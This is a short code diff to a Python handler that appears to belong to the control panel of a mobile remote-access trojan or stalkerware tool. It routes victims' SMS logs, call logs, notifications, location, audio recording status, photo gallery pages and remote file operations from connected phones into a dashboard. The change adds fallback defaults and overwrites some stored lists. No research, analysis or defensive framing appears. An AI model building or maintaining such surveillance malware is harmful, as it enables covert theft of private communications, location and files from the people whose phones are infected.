@@ -45,24 +45,24 @@ def handle_incoming_data(data, client_id):
             client_data = clients[client_id]['ui_data']
 
             handler_map = {
-                'SMS_LOG': lambda p: client_data['sms_logs'].extend(p.get('logs')),
-                'CALL_LOG': lambda p: client_data['call_logs'].extend(p.get('logs')),
-                'DEVICE_INFO': lambda p: client_data['device_info'].update(p.get('info')),
-                'APP_LIST': lambda p: client_data['apps'].extend(p.get('apps')),
-                'FILE_MANAGER_RESULT': lambda p: client_data['file_manager'].update(p.get("listing")),
-                'NOTIFICATION_DATA': lambda p: client_data['notifications'].insert(0, p.get("notification")),
+                'SMS_LOG': lambda p: client_data.update({'sms_logs': p.get('logs', [])}),
+                'CALL_LOG': lambda p: client_data.update({'call_logs': p.get('logs', [])}),
+                'DEVICE_INFO': lambda p: client_data['device_info'].update(p.get('info', {})),
+                'APP_LIST': lambda p: client_data.update({'apps': p.get('apps', [])}),
+                'FILE_MANAGER_RESULT': lambda p: client_data['file_manager'].update(p.get("listing", {})),
+                'NOTIFICATION_DATA': lambda p: client_data['notifications'].insert(0, p.get("notification", {})),
                 'LOCATION_PENDING': lambda p: client_data.update({"location_status": "pending"}),
                 'LOCATION_SUCCESS': lambda p: client_data.update({
                     "location_status": "success", 
                     "location_url": p.get("data", {}).get("url") if isinstance(p.get("data"), dict) else p.get("url"),
                     "location_image": p.get("data", {}).get("image_url") if isinstance(p.get("data"), dict) else None
                 }),
-                'LOCATION_FAIL': lambda p: client_data.update({"location_status": "error", "agent_messages": [p.get("error")]}),
+                'LOCATION_FAIL': lambda p: client_data.update({"location_status": "error", "agent_messages": [p.get("error", "Unknown error")]}),
                 'RECORD_STATUS': lambda p: client_data.update({"record_status": p.get("status")}),
-                'RECORD_FAIL': lambda p: client_data.update({"record_status": "failed", "agent_messages": [p.get("error")]}),
+                'RECORD_FAIL': lambda p: client_data.update({"record_status": "failed", "agent_messages": [p.get("error", "Record failed")]}),
                 'GALLERY_PAGE_DATA': lambda p: client_data['gallery'].update(p.get("data", {})),
                 'GALLERY_SCAN_COMPLETE': lambda p: add_log(f"[{client_id}] Gallery scan complete: {p.get('image_count')} images"),
-                'WALLPAPER_STATUS': lambda p: client_data.update({"agent_messages": [p.get("status")]}),
+                'WALLPAPER_STATUS': lambda p: client_data.update({"agent_messages": [p.get("status", "Wallpaper change triggered")]}),
                 'SHELL_RENAME_SUCCESS': lambda p: add_log(f"[{client_id}] File renamed to {p.get('new_name')}"),
                 'SHELL_DEL_SUCCESS': lambda p: add_log(f"[{client_id}] File deleted: {p.get('file')}"),
                 'UPLOAD_SUCCESS': lambda p: add_log(f"[{client_id}] File uploaded: {p.get('file')}"),
